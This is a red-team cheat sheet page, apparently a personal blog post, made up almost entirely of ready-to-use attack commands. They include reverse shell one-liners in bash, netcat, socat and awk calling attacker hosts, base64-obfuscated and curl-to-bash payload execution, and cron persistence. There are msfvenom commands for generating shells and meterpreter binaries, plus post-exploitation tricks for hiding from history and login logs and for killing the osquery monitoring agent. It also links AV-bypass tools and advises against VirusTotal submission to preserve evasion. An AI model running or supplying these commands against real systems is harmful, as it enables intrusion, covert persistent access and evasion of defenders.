+++
title = "Red Teaming"
date = "2019-11-18"
categories = [
    "security",
]

+++
## Reverse Shell

### Reverse shell with bash

```bash
bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1
```

In case shell causes the application to suspended, run in new session with `setsid`:

```bash
setsid bash -i &>/dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1 &
```
By `msfvenom`:

```bash
bash -c '0<&42-;exec 42<>/dev/tcp/10.110.28.5/4747;sh <&42 >&42 2>&42'
```

Tricks and obfuscate:

```bash
echo COMMAND_BASE64 | base64 -d | bash
echo COMMAND_HEX | xxd -p -r | bash
{echo,COMMAND_BASE64}|{base64,-d}|bash
bash -c {echo,COMMAND_BASE64}|{base64,-d}|{bash,-i}
curl http://ATTACKER_IP:PORT | bash #kind of a C&C
```

### Background reverse shell with loop and crontab

```bash
while :; do REVERSE_SHELL_COMMAND; sleep 900; done &>/dev/null &
```

```bash
echo "*/15 * * * * REVERSE_SHELL_COMMAND" > .job; crontab .job
```

### Reverse shell with netcat & socat

```bash
nc -e /bin/bash -vn ATTACKER_IP ATTACKER_PORT
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:ATTACKER_PORT
```

Listener: `socat file:`tty`,raw,echo=0 tcp-listen:ATTACKER_PORT`

### Reverse shell with awk

```bash
awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/ATTACKER_PORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

### Reverse shell with Windows Registry

https://github.com/8L4NK/evilreg

### Reverse shell with powershell, php, java, python, perl, ssh, etc... using msfvenom

Show list: `msfvenom -l`

Example show the options each payload: `msfvenom -p cmd/unix/reverse_ssh --list-options`

Some cheatsheet `msfvenom -p <tab_to_keyword>`:

```bash
msfvenom -p cmd/unix/reverse_bash LHOST=10.110.28.5
msfvenom -p cmd/unix/reverse_ssh LHOST=10.110.28.5
msfvenom -p windows/powershell_reverse_tcp LHOST=10.110.28.5
msfvenom -p cmd/unix/reverse_perl LHOST=10.110.28.5 LPORT=4747
msfvenom -p cmd/unix/reverse_python LHOST=10.110.28.5 LPORT=4545 > shell.py
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.110.28.5 LPORT=7777 -f war > shell.war
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.110.28.5 LPORT=7777 -f dll > privesc.dll
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.110.28.5 LPORT=4545 -e php/base64 R > shell.php
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.110.28.5 LPORT=4545 -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.110.28.5 LPORT=4545 -f raw > shell.jsp
#binary
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.110.28.5 LPORT=4747 -f elf > shell.elf
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.110.28.5 LPORT=4747 -f exe > shell.exe
msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.110.28.5 LPORT=4747 -f macho > shell.macho
```

A power tool for reverse ssh: https://github.com/Fahrj/reverse-ssh

Other generator: https://www.revshells.com

### Reverse shell with Windows Registry

https://github.com/8L4NK/evilreg

### Spawning TTY Shell

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
script -qc /bin/bash /dev/null
/bin/bash -i
perl —e 'exec "/bin/sh";'
```



## Bypass, Persistent and Post Exploit

### Hiding from Bash history

No bash history: `unset HISTFILE` or put a space into the head of command.

Re-load the history back to how it was when the session logged in: `history -r`

### Hide SSH session - invisible SSH

```bash
ssh -o UserKnownHostsFile=/dev/null -T user@IP_ADDRESS "bash -i"
```

This will not add the user to the `/var/log/*` file and SSH session won't show up in `w` or `who` command of logged in users. It will bypass `.profile` and `.bash_profile` as well. On client side, it will stop logging the host name to `~/.ssh/known_hosts`.

### Remove osquery (root required)

```bash
rm -rf /usr/local/sbin/osquery-extension.ext /usr/local/sbin/osqueryd
for pid in $(ps -aux | grep osquery | grep -v color=auto | awk '{print $2}'); do kill -9 $pid; done
```

### Reverse shell bypass AV with powershell, nim

A list of useful powershell scripts with 100% AV bypass ratio, tested on Windows 11 (At the time of publication): https://github.com/tihanyin/PSSW100AVB

Others: https://github.com/t3l3machus/hoaxshell

A magic tip with nim language https://github.com/dmknght/RevShellNim, https://github.com/Potato-Industries/nimrs

```bash
nim c -d:mingw --cpu:i386 reverseshell.nim
```

Do not submit the binary to virustotal. To test bypass AV: nodistribute.com, antiscan.me
